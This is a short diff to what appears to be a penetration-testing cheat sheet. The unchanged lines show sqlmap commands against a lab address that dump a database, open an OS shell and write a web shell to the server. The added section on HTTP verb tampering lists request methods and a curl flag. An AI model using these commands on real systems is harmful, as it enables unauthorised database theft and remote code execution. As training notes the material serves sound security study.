@@ -169,3 +169,17 @@ We can get an error with the above payload but the error is related to the incor
 | `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump` | Dump the entire database |
 | `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --os-shell` | Gives us a fully interactive shell |
 | `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"` | Writes a shell in specified server folder by using a request file (POST request via Burp and saved it as a local text file), and returns a fully interactive shell |
+
+### HTTP Verb Tampering
+
+`HTTP Method`
+- `HEAD`
+- `PUT`
+- `DELETE`
+- `OPTIONS`
+- `PATCH`
+
+| **Command** | **Description** |
+| ---- | ---- |
+| `-X OPTIONS` | Set HTTP Method with Curl |
+
